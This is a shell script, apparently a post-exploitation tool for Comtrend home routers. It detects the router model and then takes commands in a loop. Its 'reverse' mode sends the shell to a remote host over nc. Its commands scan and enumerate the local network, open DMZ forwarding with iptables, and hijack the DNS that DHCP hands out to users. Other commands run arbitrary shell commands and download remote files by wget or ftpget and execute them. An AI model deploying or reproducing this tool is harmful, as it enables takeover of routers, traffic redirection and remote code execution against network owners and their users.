#!/bin/sh

#Author: Javier Vicente Vallejo, http://vallejo.cc

model="NotTested"
#"Comtrend AR-5381u"  -> board id: 96328A-1241N  -> not tested
#"Comtrend AR-5387un" -> board id: 96328A-1441N1 -> tested
#"Comtrend CT-5361"   -> board id: 96348GW-11 -> tested
#"Comtrend VR-3025un" -> board id: 96368M-1341N -> tested

writabledirinitialized=0
writabledir="/var"
msgsfile="/var/tmp/bootupmessages"

####################################GET WRITABLE DIR#####################################
if [ $writabledirinitialized -eq 0 ]; then
  echo iswritable > /mnt/iswritable
  if [ -f /mnt/iswritable ]; then
    writabledir="/mnt"
    writabledirinitialized=1
  fi
fi
if [ $writabledirinitialized -eq 0 ]; then
  echo iswritable > /var/iswritable
  if [ -f /var/iswritable ]; then
    writabledir="/var"
    writabledirinitialized=1
  fi
fi
if [ $writabledirinitialized -eq 0 ]; then
  echo iswritable > /var/tmp/iswritable
  if [ -f /var/tmp/iswritable ]; then
    writabledir="/var/tmp"
    writabledirinitialized=1
  fi
fi
echo " "
echo "Writable directory is:$writabledir"
echo " "
#########################################################################################


####################################GET VERSION TO FILE##################################
if [ -f /proc/cpuinfo ]; then  
  if [ "$msgsfile" = "/var/tmp/bootupmessages" ]; then
    cat /proc/cpuinfo > /mnt/tmpmsgs
    if [ -f /mnt/tmpmsgs ]; then
      msgsfile="/mnt/tmpmsgs"
    fi
  fi  
  if [ "$msgsfile" = "/var/tmp/bootupmessages" ]; then
    cat /proc/cpuinfo > /var/tmpmsgs
    if [ -f /var/tmpmsgs ]; then
      msgsfile="/var/tmpmsgs"
    fi
  fi  
  if [ "$msgsfile" = "/var/tmp/bootupmessages" ]; then
    cat /proc/cpuinfo > /var/tmp/tmpmsgs
    if [ -f /var/tmp/tmpmsgs ]; then
      msgsfile="/var/tmp/tmpmsgs"
    fi
  fi  
fi
echo " "
echo "Getting version from:$msgsfile"
echo " "
#########################################################################################


####################################PARSE MESSAGES FILE FOR GETTING MODEL################
if [ -f $msgsfile ]; then
  counter=0
  for i in `cat $msgsfile`; do
    counter=`expr $counter + 1`
    if [ $counter -eq 100 ]; then
      break
    fi
    temp=`expr match "$i" "96328A-1441N1"`
    if [ $temp -eq 13 ]; then
      model="Comtrend AR-5387un"
      break
    fi
    temp=`expr match "$i" "96348GW-11"`
    if [ $temp -eq 10 ]; then
      model="Comtrend CT-5361"
      break
    fi        
    temp=`expr match "$i" "96328A-1241N"`
    if [ $temp -eq 12 ]; then
      model="Comtrend AR-5381u"
      break
    fi         
    temp=`expr match "$i" "96368M-1341N"`
    if [ $temp -eq 12 ]; then
      model="Comtrend VR-3025un"
      break
    fi                 
    
  done
fi
if [ $model = "NotTested" ]; then
  echo " "
  echo "=============================================="
  echo "This script has not been tested on this model."
  echo "Some commands could not work here.".
  echo "=============================================="
  echo " "
else
  echo " "
  echo "========================================================="
  echo "This script has been tested on this model."
  echo "But depending on the model, some commands cound not work.".
  echo "========================================================="
  echo " "
fi
echo " "
echo "==========================="
echo "Current model: "$model
echo "==========================="
echo " "       
#########################################################################################


####################################RETRY LOOP###################################################
while true; do
  
  
  ####################################REVERSE TCP LAUNCH#########################################    
  if test "$1" = "reverse" ; then    
    mytty=`tty`
    if test $mytty = ""; then
      mytty="/dev/ttyp0"
    fi
    sh -c `nc $2 $3 < $mytty  | $0 | nc $2 $3` &
    exit
  
  ####################################DO WORK LAUNCH#############################################    
  elif test "$1" = ""; then
    
    while read LINE; do
    
      echo "${LINE}"
    
      if [ "${LINE}" = "" ]; then
        #empty line
        #exit
        echo "-"
              
      else
        #valid line
      
        ####################################HELP#################################################    
        temp=`expr match "${LINE}" "help"`
        if [ $temp -eq 4 ]; then
          echo " "
          echo "  Launch script arguments"
          echo "  -----------------------"
          echo "  scriptname reverse <ip server> <port server> -> connect to remote and start to work. It uses tty and nc"
          echo "  scriptname                                   -> start to work"
          echo " "
          echo " "
          echo " "
          echo "Core commands"
          echo "============="
          echo " "
          echo "  Command                                        Description"
          echo "  -------                                        -----------"
          echo "  help                                           This help."
          echo "  model                                          Model of this device."
          echo "  hosts                                          Show info about hosts in the network."
          echo "  connections                                    Show info about tcp or udp connections."
          echo "  pingnet <ip start> <ip end>                    Ping from start to end ips, it uses ping."
          echo "  adddmz <hosts ip address>                      Add dmz from wan to local host, it uses iptables."
          echo "  deldmz <hosts ip address>                      Del dmz from wan to local host, it uses iptables."
          echo "  ipconfig                                       Interfaces information, it uses ifconfig."
          echo "  ps                                             Show processes, it uses ps."
          echo "  ftpgetandexec1 <ip:port> <usr> <pass> <fname>  Get a file with ftpget, download it to /<writabledir>/ftpgetandexecfile and execute it." 
          echo "  wgetandexec1 <url>                             Get a file with wget, download it to /<writabledir>/wgetandexecfile and exec it."
          echo "  setdhcpdns1 <dns_server_ip>                    Change dns address that dhcp server gives to hosts." 
          echo "                                                 It uses /etc/udhcpd.conf, /<writabledir>, killall and" 
          echo "                                                 dhcpd."
          echo "  *downupinterfaces                              Restart interfaces without restarting router."
          echo "                                                 You will be disconnected. Commands used for this"
          echo "                                                 purpose depends on the specific router. The script"
          echo "                                                 will detect the current router and it will use the" 
          echo "                                                 apropiated commands."
          echo "  raw <command> <params>                         Execute a raw command in the current shell"
          echo "                                                 (it will depend on the system where script"
          echo "                                                 is being executed)."          
        fi    
        #########################################################################################    
    
    
        ####################################MODEL################################################ 
        temp=`expr substr "${LINE}" 1 5`
        temp=`expr match "$temp" "model"`
        if [ $temp -eq 5 ]; then
          echo "Model:"
          echo $model
        fi
        #########################################################################################    
    
    
        ####################################HOSTS################################################ 
        temp=`expr substr "${LINE}" 1 5`
        temp=`expr match "$temp" "hosts"`
        if [ $temp -eq 5 ]; then
          if [ -f /var/hosts ]; then
            cat /var/hosts
          elif [ -f /var/udhcpd/udhcpd.leases ]; then
            cat /var/udhcpd/udhcpd.leases
          else
            echo "Unable to enum hosts"
          fi
        fi
        #########################################################################################
      
      
        ####################################CONNECTIONS########################################## 
        temp=`expr substr "${LINE}" 1 11`
        temp=`expr match "$temp" "connections"`
        if [ $temp -eq 11 ]; then
          temp=0
          
          if [ -f /proc/net/nf_conntrack ]; then
            cat /proc/net/nf_conntrack
            echo "============================"
            temp=1
          fi
          
          if [ -f /proc/net/ip_conntrack ]; then
            cat /proc/net/ip_conntrack
            echo "============================"
            temp=1
          fi          
          
          if [ -f /proc/net/tcp ]; then
            cat /proc/net/tcp
            echo "============================"
            temp=1
          fi                    

          if [ -f /proc/net/udp ]; then
            cat /proc/net/udp
            echo "============================"
            temp=1
          fi                    

          if [ -f /proc/net/arp ]; then
            cat /proc/net/arp
            echo "============================"
            temp=1
          fi                    
          
          if [ -d /proc/fcache ]; then
            cat /proc/fcache/*
            echo "============================"
            temp=1
          fi
          
          if [ $temp -eq 0 ]; then
            echo "Unable to enum connections"
          fi
        fi
        #########################################################################################      
        
      
        ####################################PINGNET##############################################                
        temp=`expr substr "${LINE}" 1 7`
        temp=`expr match "$temp" "pingnet"`
        if [ $temp -eq 7 ]; then
          len=`expr length "${LINE}"`
          pos=`expr index "${LINE}" " "`
          pos=`expr $pos + 1`
          lenparam1=`expr $len - $pos`
          lenparam1=`expr $lenparam1 + 1`
          param1=`expr substr "${LINE}" $pos $lenparam1`
          pos=`expr index "$param1" " "`
          pos=`expr $pos + 1`
          lenparam2=`expr $lenparam1 - $pos`
          lenparam2=`expr $lenparam2 + 1`
          param2=`expr substr "$param1" $pos $lenparam2`
          lenparam2=`expr $lenparam2 + 1`
          lenparam1=`expr $lenparam1 - $lenparam2`
          param1=`expr substr "$param1" 1 $lenparam1`
    
          #param1 -> ip start
          #param2 -> ip end
          
          while true; do #while param1 != param2, ping param1 and increase param1
          
            param1cpy="$param1"
            
            pos=`expr index "$param1cpy" "."`
            pos=`expr $pos - 1`
            octec1=`expr substr "$param1cpy" 1 $pos`
            pos=`expr $pos + 2`
            len=`expr length "$param1cpy"`
            param1cpy=`expr substr "$param1cpy" $pos $len`
            
            pos=`expr index "$param1cpy" "."`
            pos=`expr $pos - 1`
            octec2=`expr substr "$param1cpy" 1 $pos`
            pos=`expr $pos + 2`
            len=`expr length "$param1cpy"`
            param1cpy=`expr substr "$param1cpy" $pos $len`
        
            pos=`expr index "$param1cpy" "."`
            pos=`expr $pos - 1`
            octec3=`expr substr "$param1cpy" 1 $pos`
            pos=`expr $pos + 2`
            len=`expr length "$param1cpy"`
            param1cpy=`expr substr "$param1cpy" $pos $len`
            
            octec4="$param1cpy"
                  
            carry=0
            len=`expr length "$octec4"`
            temp=`expr match "$octec4" "255"`
            if [ $temp -eq $len ]; then
              octec4=0
              carry=1
            else
              octec4=`expr $octec4 + 1`
            fi
    
            if [ $carry -eq 1 ]; then
              carry=0
              len=`expr length "$octec3"`
              temp=`expr match "$octec3" "255"`
              if [ $temp -eq $len ]; then
                octec3=0
                carry=1
              else
                octec3=`expr "$octec3" + 1`
              fi
            fi
    
            if [ $carry -eq 1 ]; then
              carry=0
              len=`expr length "$octec2"`
              temp=`expr match "$octec2" "255"`
              if [ $temp -eq $len ]; then
                octec2=0
                carry=1
              else
                octec2=`expr $octec2 + 1`
              fi
            fi
            
            if [ $carry -eq 1 ]; then
              carry=0
              len=`expr length "$octec1"`
              temp=`expr match "$octec1" "255"`
              if [ $temp -eq $len ]; then
                octec1=0
                carry=1
              else
                octec1=`expr $octec1 + 1`
              fi
            fi
            
            ping -c 1 "$param1" &
            
            param1="$octec1"".""$octec2"".""$octec3"".""$octec4"
          
            temp=`expr match "$param1" "$param2"`
            len=`expr length "$param2"`
            
            if [ $temp -eq $len ]; then
              break
            fi
          
          done
          
          #ping the last ip too
          ping -c 1 $param1 &
          
        fi            
        #########################################################################################    
        
        
        ####################################ADDDMZ###############################################                
        temp=`expr substr "${LINE}" 1 6`
        temp=`expr match "$temp" "adddmz"`
        if [ $temp -eq 6 ]; then
          len=`expr length "${LINE}"`
          pos=`expr index "${LINE}" " "`
          pos=`expr $pos + 1`
          lenparam1=`expr $len - $pos`
          lenparam1=`expr $lenparam1 + 1`
          param1=`expr substr "${LINE}" $pos $lenparam1`
          echo "iptables -A FORWARD -d $param1 -j ACCEPT"
          iptables -A FORWARD -d $param1 -j ACCEPT
          echo $?
        fi        
        #########################################################################################    
    
    
        ####################################DELDMZ###############################################                
        temp=`expr substr "${LINE}" 1 6`
        temp=`expr match "$temp" "deldmz"`
        if [ $temp -eq 6 ]; then
          len=`expr length "${LINE}"`
          pos=`expr index "${LINE}" " "`
          pos=`expr $pos + 1`
          lenparam1=`expr $len - $pos`
          lenparam1=`expr $lenparam1 + 1`
          param1=`expr substr "${LINE}" $pos $lenparam1`
          echo "iptables -D FORWARD -d $param1 -j ACCEPT"
          iptables -D FORWARD -d $param1 -j ACCEPT
          echo $?
        fi        
        #########################################################################################    
    
    
        ####################################IPCONFIG#############################################                
        temp=`expr substr "${LINE}" 1 8`
        temp=`expr match "$temp" "ipconfig"`
        if [ $temp -eq 8 ]; then
          ifconfig
        fi        
        #########################################################################################    
        
        
        ####################################SETDHCPDNS1###########################################                
        temp=`expr substr "${LINE}" 1 11`
        temp=`expr match "$temp" "setdhcpdns1"`
        
        if [ $temp -eq 11 ]; then          

          len=`expr length "${LINE}"`
          pos=`expr index "${LINE}" " "`
          pos=`expr $pos + 1`
          lenparam1=`expr $len - $pos`
          lenparam1=`expr $lenparam1 + 1`
          param1=`expr substr "${LINE}" $pos $lenparam1`        
        
          if [ -f /etc/udhcpd.conf ]; then    
            
            #some devices use this file to modify dns and it is writable
            #so we try to put there our dns
            echo "writting /etc/resolv.conf"
            echo "nameserver $param1" > /etc/resolv.conf
            echo $?
            
            #in addition we are going to try to modify /etc/udhcpd.conf
            cat /etc/udhcpd.conf > $writabledir/tmp.conf
	    echo "option dns $param1" > /etc/udhcpd.conf
            if [ $? -eq 0 ]; then
              #it was possible to write directly to /etc/udhcpd.conf
              cat $writabledir/tmp.conf >> /etc/udhcpd.conf
              echo "writting /etc/udhcpd.conf"
              killall dhcpd
              if [ $? -eq 0 ]; then
                echo "launching   dhcpd /etc/udhcpd.conf &"
              	dhcpd /etc/udhcpd.conf &
              fi
            else 
              #it was not possible to write directly to /etc/udhcpd.conf, 
              #make a copy, kill dhcp and launch it again
              echo "copying /etc/udhcpd.conf to $writabledir/tmp.conf"
              killall dhcpd              
              echo "option dns $param1" > $writabledir/tmp.conf
              cat /etc/udhcpd.conf >> $writabledir/tmp.conf
              if [ -f $writabledir/tmp.conf ]; then
              	echo "launching dhcpd $writabledir/tmp.conf &"
                dhcpd $writabledir/tmp.conf &
              else              	
                echo "something failed, launching dhcpd /etc/udhcpd.conf & again"
                dhcpd /etc/udhcpd.conf &
              fi
            fi
          else          
            echo "/etc/udhcpd.conf doesnt exist"                
          fi          
        fi        
        #########################################################################################        
            
            
        ####################################PS###################################################                
        temp=`expr substr "${LINE}" 1 2`
        temp=`expr match "$temp" "ps"`
        if [ $temp -eq 2 ]; then          
          ps               
        fi        
        #########################################################################################                


        ####################################RAW##################################################                
        temp=`expr substr "${LINE}" 1 3`
        temp=`expr match "$temp" "raw"`
        if [ $temp -eq 3 ]; then          
          len=`expr length "${LINE}"`
          pos=`expr index "${LINE}" " "`
          pos=`expr $pos + 1`
          lenparam1=`expr $len - $pos`
          lenparam1=`expr $lenparam1 + 1`
          param1=`expr substr "${LINE}" $pos $lenparam1`
          $param1
        fi                
        #########################################################################################                
        
        
        ####################################FTPGETANDEXEC1#######################################                
        temp=`expr substr "${LINE}" 1 14`
        temp=`expr match "$temp" "ftpgetandexec1"`
        if [ $temp -eq 14 ]; then
          len=`expr length "${LINE}"`
          pos=`expr index "${LINE}" " "`
          pos=`expr $pos + 1`
          lenparam1=`expr $len - $pos`
          lenparam1=`expr $lenparam1 + 1`
          param1=`expr substr "${LINE}" $pos $lenparam1`
          pos=`expr index "$param1" " "`
          pos=`expr $pos + 1`
          lenparam2=`expr $lenparam1 - $pos`
          lenparam2=`expr $lenparam2 + 1`
          param2=`expr substr "$param1" $pos $lenparam2`
          pos=`expr index "$param2" " "`
          pos=`expr $pos + 1`
          lenparam3=`expr $lenparam2 - $pos`
          lenparam3=`expr $lenparam3 + 1`
          param3=`expr substr "$param2" $pos $lenparam3`
          pos=`expr index "$param3" " "`
          pos=`expr $pos + 1`
          lenparam4=`expr $lenparam3 - $pos`
          lenparam4=`expr $lenparam4 + 1`
          param4=`expr substr "$param3" $pos $lenparam4`
          lenparam2=`expr $lenparam2 + 1`
          lenparam1=`expr $lenparam1 - $lenparam2`
          param1=`expr substr "$param1" 1 $lenparam1`

          pos=`expr index "$param1" ":"`
          pos=`expr $pos + 1`
          lenparam12=`expr $lenparam1 - $pos`
          lenparam12=`expr $lenparam12 + 1`
          param12=`expr substr "$param1" $pos $lenparam12`
          pos=`expr $pos - 2`
          param11=`expr substr "$param1" 1 $pos`
          
          pos=`expr index "$param2" " "`
          pos=`expr $pos - 1`
          param2=`expr substr "$param2" 1 $pos`
          
          pos=`expr index "$param3" " "`
          pos=`expr $pos - 1`
          param3=`expr substr "$param3" 1 $pos`
          
          rm $writabledir/ftpgetandexecfile
          echo "ftpget -P $param12 -u $param2 -p $param3 $param11 $param4 $writabledir/ftpgetandexecfile"
          ftpget -P $param12 -u $param2 -p $param3 $param11 $param4 $writabledir/ftpgetandexecfile
          echo $?
          echo "chmod 777 $writabledir/ftpgetandexecfile"
          chmod 777 $writabledir/ftpgetandexecfile
          if [ $? -eq 0 ]; then
            echo "$writabledir/ftpgetandexecfile"
            $writabledir/ftpgetandexecfile
          else
            echo $?
            echo "sh $writabledir/ftpgetandexecfile"
            sh $writabledir/ftpgetandexecfile
          fi
        fi        
        #########################################################################################        
        
        
        ####################################WGETANDEXEC1#########################################                
        temp=`expr substr "${LINE}" 1 12`
        temp=`expr match "$temp" "wgetandexec1"`
        if [ $temp -eq 12 ]; then
          len=`expr length "${LINE}"`
          pos=`expr index "${LINE}" " "`
          pos=`expr $pos + 1`
          lenparam1=`expr $len - $pos`
          lenparam1=`expr $lenparam1 + 1`
          param1=`expr substr "${LINE}" $pos $lenparam1`         
          
          rm $writabledir/wgetandexec
          echo "wget -O $writabledir/wgetandexec $param1"
          wget -O $writabledir/wgetandexec $param1
          echo $?
          echo "chmod 777 $writabledir/wgetandexec"
          chmod 777 $writabledir/wgetandexec
          if [ $? -eq 0 ]; then
            echo "$writabledir/wgetandexec"
            "$writabledir/wgetandexec"
          else
            echo $?
            echo "sh "$writabledir/wgetandexec""
            sh "$writabledir/wgetandexec"
          fi          
        fi          
        #########################################################################################        
        
      fi
  
    done
  
  fi
  
done
#################################################################################################
